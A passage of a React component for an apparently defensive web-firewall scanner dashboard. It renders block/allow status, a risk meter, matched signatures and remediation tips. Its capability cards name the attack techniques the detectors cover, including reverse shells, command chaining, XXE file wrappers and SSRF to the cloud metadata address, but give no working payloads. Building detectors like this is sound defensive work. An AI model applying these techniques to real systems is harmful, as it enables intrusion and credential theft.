                        <FiCpu className="w-3 h-3 text-indigo-400" />
                        <span>Intercepting Sentinel:</span>
                        <strong className="text-text-custom">{defenseAgent}</strong>
                      </p>
                    </div>
                  </div>

                  <div className="flex flex-col items-start sm:items-end gap-1.5">
                    <span
                      className={`text-[11px] font-black uppercase px-3 py-1 rounded-full border tracking-wider flex items-center gap-1.5 shadow-sm ${
                        blocked
                          ? 'bg-red-500/20 text-red-400 border-red-500/40'
                          : 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40'
                      }`}
                    >
                      {blocked ? <FiAlertOctagon className="w-3.5 h-3.5" /> : <FiCheck className="w-3.5 h-3.5" />}
                      {blocked ? 'BLOCKED & NEUTRALIZED (403)' : 'CLEAN & FORWARDED (200)'}
                    </span>
                    <span className="text-[10px] text-text-muted">
                      {blocked ? 'Autonomous WAF Interception Triggered' : 'Payload Conforms to Safe Profile'}
                    </span>
                  </div>
                </div>

                {/* 2. Autonomous Defense Technology Telemetry Grid */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                  <div className="p-3 bg-bg-custom border border-border-custom rounded-xl space-y-1">
                    <p className="text-[10px] font-semibold text-text-muted uppercase tracking-wider flex items-center gap-1">
                      <FiShield className="w-3 h-3 text-indigo-400" /> Defense Action
                    </p>
                    <p className="text-[11px] font-bold text-text-custom leading-snug">
                      {defenseAction}
                    </p>
                  </div>
                  <div className="p-3 bg-bg-custom border border-border-custom rounded-xl space-y-1">
                    <p className="text-[10px] font-semibold text-text-muted uppercase tracking-wider flex items-center gap-1">
                      <FiLayers className="w-3 h-3 text-cyan-400" /> Shield Architecture
                    </p>
                    <p className="text-[11px] font-bold text-text-custom leading-snug">
                      {shieldType}
                    </p>
                  </div>
                  <div className="p-3 bg-bg-custom border border-border-custom rounded-xl space-y-1">
                    <p className="text-[10px] font-semibold text-text-muted uppercase tracking-wider flex items-center gap-1">
                      <FiDatabase className="w-3 h-3 text-emerald-400" /> Gateway Disposition
                    </p>
                    <p className="text-[11px] font-bold text-text-custom leading-snug">
                      {blocked ? 'Drop Connection & Quarantine' : 'Pass Through to Service Endpoint'}
                    </p>
                  </div>
                </div>

                {/* 3. Visual Defense Pipeline Path */}
                <div className="p-3.5 bg-bg-custom/80 border border-border-custom rounded-xl space-y-2">
                  <p className="text-[10px] font-semibold text-text-muted uppercase tracking-wider">
                    Autonomous Multi-Threat Defense Pipeline
                  </p>
                  <div className="flex flex-col sm:flex-row items-center justify-between gap-2 text-[11px]">
                    <div className="p-2 rounded-lg bg-slate-800/60 border border-border-custom flex-1 text-center w-full">
                      <span className="text-[10px] text-text-muted block">Inbound Probe</span>
                      <strong className="text-text-custom truncate block font-mono text-[10px]">
                        {scanMode === 'payload' ? (rawPayload.slice(0, 24) || 'Raw String') : (reqUrl || 'HTTP Request')}
                      </strong>
                    </div>
                    <FiCornerDownRight className="text-indigo-400 rotate-0 sm:-rotate-90 hidden sm:block" />
                    <div className="p-2 rounded-lg bg-indigo-500/10 border border-indigo-500/30 flex-1 text-center w-full">
                      <span className="text-[10px] text-indigo-400 block font-semibold">Active Agent</span>
                      <strong className="text-text-custom block truncate">{defenseAgent}</strong>
                    </div>
                    <FiCornerDownRight className="text-indigo-400 rotate-0 sm:-rotate-90 hidden sm:block" />
                    <div
                      className={`p-2 rounded-lg border flex-1 text-center w-full ${
                        blocked
                          ? 'bg-red-500/15 border-red-500/40 text-red-400 font-bold'
                          : 'bg-emerald-500/15 border-emerald-500/40 text-emerald-400 font-bold'
                      }`}
                    >
                      <span className="text-[10px] block opacity-80">Final Action</span>
                      <span>{blocked ? '⛔ Neutralized (403)' : '✅ Cleared (200)'}</span>
                    </div>
                  </div>
                </div>

                {/* 4. Risk Score Meter */}
                <RiskMeter score={riskScore} />

                {/* 5. AI Defense Explanation */}
                <div className="p-3.5 bg-bg-custom border border-border-custom rounded-xl text-xs text-text-muted leading-relaxed">
                  <p className="font-bold text-text-custom mb-1 flex items-center gap-1.5">
                    <FiCpu className="w-3.5 h-3.5 text-indigo-400" />
                    Autonomous Agent Analysis Summary
                  </p>
                  {explanation}
                </div>

                {/* 6. Matched Signatures */}
                {matches.length > 0 && (
                  <div>
                    <p className="text-[10px] font-semibold text-text-muted uppercase mb-2 tracking-wider">
                      Matched Threat Signatures ({matches.length})
                    </p>
                    <div className="space-y-2 max-h-56 overflow-y-auto pr-1">
                      {matches.map((m, idx) => {
                        const mcfg = CATEGORY_CONFIG[m.category] || CATEGORY_CONFIG['Safe'];
                        return (
                          <div
                            key={idx}
                            className="flex items-start gap-2.5 p-2.5 rounded-lg border"
                            style={{ backgroundColor: mcfg.bg, borderColor: mcfg.border }}
                          >
                            <span className="text-base mt-0.5">{mcfg.icon}</span>
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center gap-2">
                                <p className="text-[11px] font-bold" style={{ color: mcfg.color }}>
                                  {m.category}
                                </p>
                                <span className="text-[9px] text-text-muted font-mono">
                                  Weight: {m.weight}
                                </span>
                              </div>
                              <p className="text-[11px] text-text-custom font-medium mt-0.5">{m.description}</p>
                              {m.source && (
                                <p className="text-[9px] text-text-muted mt-0.5 font-mono">
                                  Section: {m.source}
                                </p>
                              )}
                            </div>
                            <SeverityBadge level={m.severity} />
                          </div>
                        );
                      })}
                    </div>
                  </div>
                )}

                {/* 7. Developer Remediation Guidance */}
                {blocked && catCfg.remediation && (
                  <div className="p-3 bg-amber-500/10 border border-amber-500/25 rounded-xl text-xs space-y-1">
                    <p className="font-bold text-amber-400 flex items-center gap-1.5">
                      <FiAlertTriangle className="w-3.5 h-3.5" />
                      Recommended Application Remediation
                    </p>
                    <p className="text-[11px] text-text-muted leading-relaxed">
                      {catCfg.remediation}
                    </p>
                  </div>
                )}

              </div>
            )}
          </Card>
        </div>
      </div>

      {/* ── Capabilities Info Cards (All 11 Vectors) ── */}
      <div>
        <h3 className="text-xs font-bold text-text-muted uppercase tracking-wider mb-3 flex items-center gap-1.5">
          <FiShield className="w-3.5 h-3.5 text-indigo-400" />
          Multi-Threat Defense Technology Architecture
        </h3>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3.5">
          {[
            {
              icon: <FiDatabase className="w-5 h-5 text-rose-400" />,
              title: 'SQL Injection Defense',
              agent: 'SQLi Deep Sentinel Agent',
              desc: 'Dual ML Ensemble + Heuristic AST parsing defending against Tautology bypasses, UNION extractions, Stacked operations, and time-based blind SQLi probes.',
              bg: 'rgba(225,29,72,0.06)', border: 'rgba(225,29,72,0.22)'
            },
            {
              icon: <FiLock className="w-5 h-5 text-amber-400" />,
              title: 'Broken Access Control',
              agent: 'Auth & Access Guardian Agent',
              desc: 'Enforces strict token boundary checks, prevents privilege escalation parameter tampering, IDOR object access, and administrative URL probing.',
              bg: 'rgba(245,158,11,0.06)', border: 'rgba(245,158,11,0.22)'
            },
            {
              icon: <FiFileText className="w-5 h-5 text-red-400" />,
              title: 'XML / XXE Injection',
              agent: 'XXE Parser Barrier Agent',
              desc: 'Identifies SYSTEM/PUBLIC entity declarations, recursive Billion Laughs expansion attacks, and protocol wrapper abuse (file://, php://).',
              bg: 'rgba(239,68,68,0.06)', border: 'rgba(239,68,68,0.22)'
            },
            {
              icon: <FiTerminal className="w-5 h-5 text-red-600" />,
              title: 'OS Command Injection',
              agent: 'OS Command Guard Agent',
              desc: 'Detects shell separator command chaining (; , &&, |), dynamic evaluation primitives (eval, exec), subshell substitution, and reverse shells.',
              bg: 'rgba(220,38,38,0.06)', border: 'rgba(220,38,38,0.22)'
            },
            {
              icon: <FiCode className="w-5 h-5 text-orange-400" />,
              title: 'Cross-Site Scripting (XSS)',
              agent: 'XSS Purifier Sentinel Agent',
              desc: 'Neutralizes inline script tag injection, dangerous DOM event handlers, javascript:// schemes, SVG payloads, and multi-layer encoded variants.',
              bg: 'rgba(249,115,22,0.06)', border: 'rgba(249,115,22,0.22)'
            },
            {
              icon: <FiGlobe className="w-5 h-5 text-cyan-400" />,
              title: 'SSRF & Cloud Metadata',
              agent: 'SSRF Egress Firewall Agent',
              desc: 'Blocks malicious egress targeting AWS/GCP cloud metadata endpoints (169.254.169.254), private RFC-1918 subnets, and localhost redirection.',
              bg: 'rgba(6,182,212,0.06)', border: 'rgba(6,182,212,0.22)'
            },
          ].map((card, i) => (
            <div key={i} className="p-4 rounded-xl border space-y-1.5 transition-all hover:border-indigo-500/40"
              style={{ backgroundColor: card.bg, borderColor: card.border }}>
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  {card.icon}
                  <h4 className="text-xs font-bold text-text-custom">{card.title}</h4>
                </div>
                <span className="text-[9px] font-semibold text-text-muted px-2 py-0.5 rounded bg-bg-custom border border-border-custom">
                  {card.agent}
                </span>
              </div>
              <p className="text-[11px] text-text-muted leading-relaxed">{card.desc}</p>
            </div>
          ))}
        </div>
      </div>

    </div>
  );
};

export default MultiThreatScanner;
